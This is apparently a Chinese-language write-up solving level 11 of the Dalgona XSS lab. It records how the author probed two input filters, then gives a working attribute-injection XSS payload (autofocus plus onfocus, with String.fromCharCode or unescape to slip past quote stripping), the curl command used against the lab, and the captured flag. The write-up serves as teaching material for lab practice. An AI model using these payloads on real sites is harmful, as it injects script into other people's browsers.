## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 11 关
（样式表 `static/css/xss/xss11.css`，标题 `Dalgona - Triangle`）。

入口 `Page` → `GET /page?name=...`，反射位置与同族不同：

```html
<input type=text name=name placeholder="Enter your name..." value="INPUT">
```

**输入落在 `value` 属性内部**，而不是文本节点。引号没有被转义。

### 关键观察

**1. 过滤有两条规则，都是"删除"而非"报错"。**

把输入夹在 `Q…Q` 之间提交，看反射结果：

| 子串 | 反射 | 推论 |
| --- | --- | --- |
| `<a` `<b` `<s` `<i` `<x` `<p` | 全部消失 | `<` + 字母被删（两个字符一起） |
| `<em` → `m` / `<div` → `iv` / `<script` → `cript` | 删掉 `<` + 第一个字母 | 同上 |
| `</` → 消失 | `</s` → `s` | `<` + `/` 也被删 |
| `<1` → `<1` | 保留 | 数字不算 |
| `< a` → `< a` | 保留 | 空格不算 |
| `"XSS"` / `'XSS'` | 整体消失 | **带引号的 XSS 被整段删掉** |
| `XSS`（裸）→ `XSS` | 保留 | 只删带引号的形式 |
| `alert("XSS")` → `alert()` | — | 引号连内容一起没了 |
| `autofocus` / `onfocus` / `alert` 单词 | 保留 | 没有关键字黑名单 |
| `a b` → `a b` | 保留 | **空白不删**（与 xben-011 不同） |

即：

```text
re.sub(r'<[A-Za-z/]', '', s)        # < + 字母或 /
re.sub(r'"XSS"|\'XSS\'', '', s)     # 带引号的 XSS 整段删除
```

第二条是本题的陷阱：它专门堵住"直接写 `alert("XSS")`"。

**2. 因为反射在属性里，根本不需要 `<`。**

标签一律被破坏（`<` + 字母被删），但我们的输入就在
`<input ... value="INPUT">` 的引号内，所以只要闭合引号、往**同一个 input 元素**上
追加事件属性即可，不需要新建任何标签。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

payload 分解：

| 片段 | 作用 |
| --- | --- |
| `" ` | 闭合 `value="`，并留一个空格（**必需**，见复盘） |
| `autofocus` | 页面加载后立即聚焦该 input |
| `onfocus=alert(...)` | 聚焦即触发 |
| `String.fromCharCode(88,83,83)` | 运行时生成 `"XSS"`，避开引号剥离 |
| ` x="` | 收尾，把模板原本的闭合引号吞进一个无用属性 |

响应：

```html
Congratulations!<p> Here is the flag: flag{09ba4b44-5dfd-4787-a32c-cc595e69af8f}
```

等价的替代写法（都验证通过）：

```text
" autofocus onfocus=alert(unescape('%58%53%53')) x="
```

## 复盘

- **反射位置决定攻击面。** 同族里 004/008 在文本节点、010 在 JS 字符串、011 在文本节点、
  本题在 **HTML 属性值**。属性上下文里"闭合引号 → 追加属性"往往比"造一个标签"更省事，
  尤其当过滤专门破坏 `<` 的时候。
- **属性注入的收尾要吃掉模板的闭合引号。** payload 末尾的 `x="` 让模板自带的 `"` 变成一个
  空属性 `x=""` 的结束符；不写它的话，模板的 `"` 会破坏后续解析。
- **闭合引号后面必须有空格。** 我一开始写 `"autofocus onfocus=...`（没有空格），失败；
  改成 `" autofocus ...` 就通过。HTML 解析器需要空白分隔"刚结束的 value 属性"和"新属性名"，
  否则 `"autofocus` 会被当成畸形属性名的一部分。
- **"删掉 `"XSS"`" 这类过滤，正解是把字符串挪到运行时。** `String.fromCharCode` /
  `unescape('%58%53%53')` 都不含字面 `XSS`，一步就绕过；而尝试用单引号
  （`'XSS'`）无效——说明它两种引号都删。
- **逐字符/逐子串探测能快速还原两条规则。** 我用 `Q…Q` 包裹法测了 26 个片段，
  一次得到"`<`+字母被删""引号 XSS 被删""空白保留"三个结论，
  比读实现或盲试 payload 都快。
